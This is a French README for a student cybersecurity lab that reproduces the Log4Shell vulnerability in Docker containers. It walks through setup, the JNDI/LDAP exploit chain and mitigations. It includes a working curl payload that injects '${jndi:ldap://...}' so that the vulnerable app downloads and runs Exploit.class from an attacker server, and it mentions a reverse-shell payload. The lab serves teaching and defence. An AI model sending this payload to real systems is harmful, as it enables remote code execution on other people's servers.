Lab DIABLE – Log4Shell (CVE-2021-44228)
Version : 1.0
Auteur : Farah Zerzeri
Projet : DIABLE v3.0 – DSI ISFA 2025-2026
Technologies : Docker, Spring Boot, Log4j, Marshalsec, Flask, HTML
Difficulté : Avancé
Type : Remote Code Execution (RCE)

📋 Description
Ce laboratoire pédagogique reproduit de manière contrôlée la vulnérabilité Log4Shell (CVE-2021-44228) dans un environnement conteneurisé.

Il permet de comprendre :

le fonctionnement interne de Log4j

les attaques JNDI/LDAP

l’exécution de code à distance via Log4Shell

la chaîne d’exploitation complète :

Web app vulnérable

LDAP server malveillant

serveur HTTP payload

payload Java exécuté

Le lab inclut également une interface web pédagogique en Flask permettant d’expliquer et simuler l’attaque.

🎯 Objectifs pédagogiques
Comprendre Log4Shell et son impact

Étudier le mécanisme JNDI injection

Observer un flux LDAP malveillant

Déployer un environnement d’attaque Dockerisé

Exécuter un payload Java distant

Vérifier une compromission réelle du container

Comprendre les mesures de mitigation

🧱 Architecture du lab
Le lab repose sur 4 composants principaux :

1️⃣ Application vulnérable
Spring Boot

Log4j 2.14.1

Endpoint vulnérable /api/search

Log des headers utilisateur

2️⃣ Serveur LDAP malveillant
Marshalsec

Répond aux requêtes JNDI

Redirige vers un payload Java

3️⃣ Serveur HTTP attaquant
Python http.server

Héberge :

Exploit.class

Rev.class

4️⃣ Interface pédagogique
Flask

Pages :

login

dashboard

quiz

learning

démonstration Log4Shell

📂 Structure du projet
log4shell-dockerlab-main/
│
├── docker-compose.yml
├── README.md
│
├── attacker-webserver/
│   ├── Exploit.java
│   ├── Exploit.class
│   ├── Rev.java
│   └── Rev.class
│
├── log4shell-vulnerable-app/
│   ├── Dockerfile
│   ├── build.gradle
│   └── src/main/java/...
│
├── marshalsec/
│   ├── Dockerfile
│   └── src/...
│
└── web-interface/
    ├── app.py
    ├── templates/
    │   ├── index.html
    │   ├── dashboard.html
    │   ├── login.html
    │   ├── learn.html
    │   ├── quiz.html
    │   └── professor.html
⚙️ Prérequis
Docker

Docker Compose

Python 3

Java JDK 8

2 GB RAM minimum

🚀 Installation
1️⃣ Cloner le projet
git clone <repo>
cd log4shell-dockerlab-main
2️⃣ Lancer l’environnement
docker compose up --build -d
Containers lancés :

farah-log4shell-vulnerable-app

farah-log4shell-ldap

3️⃣ Lancer le serveur payload
cd attacker-webserver
python3 -m http.server 8888
🌐 Accès
Service	URL
Web vulnérable	http://localhost:8088
Flask interface	http://localhost:5000
LDAP	localhost:1389
💣 Exploitation Log4Shell
Payload d’attaque
curl -H 'X-Api-Version: ${jndi:ldap://<IP>:1389/Exploit}' http://<IP>:8088/api/search
Exemple :

curl -H 'X-Api-Version: ${jndi:ldap://172.18.37.180:1389/Exploit}' http://172.18.37.180:8088/api/search
🔍 Observation de l’attaque
LDAP logs
Send LDAP reference result for Exploit redirecting to http://172.18.37.180:8888/Exploit.class
HTTP attacker logs
GET /Exploit.class HTTP/1.1
🧨 Vérification RCE
docker exec farah-log4shell-vulnerable-app ls /tmp
Résultat attendu :

log4shell-pwned
Cela confirme l’exécution du code distant.

🧠 Fonctionnement technique
Header injecté dans la requête HTTP

Log4j l’interprète

Lookup JNDI déclenché

Requête LDAP envoyée

LDAP retourne référence HTTP

App télécharge Exploit.class

JVM exécute le bytecode

Commande système exécutée

📚 Théorie
Log4Shell permet :

Remote Code Execution

Data exfiltration

Compromission serveur

Versions vulnérables :

Log4j 2.0 → 2.14.1
🛡️ Mitigations
Update Log4j 2.17+

Disable JNDI

Filtrer entrées utilisateur

WAF signatures

Monitoring logs

🧪 Interface Flask pédagogique
Fonctionnalités :

login simulation

explication Log4Shell

quiz cybersécurité

dashboard étudiant

démonstration injection

Objectif : faciliter l’apprentissage.

📊 Statistiques
3 containers Docker

1 interface pédagogique

2 payloads Java

1 RCE fonctionnel

100% reproductible

⚠️ Disclaimer
Ce lab contient des vulnérabilités intentionnelles.

Utilisation strictement pédagogique.

Ne jamais déployer en production.

👩‍💻 Auteur
Farah Zerzeri
Cybersecurity Engineer Student
DSI ISFA 2025-2026
Projet DIABLE v3.0

📎 Références
CVE-2021-44228

OWASP

Lunasec advisory

Apache Log4j docs


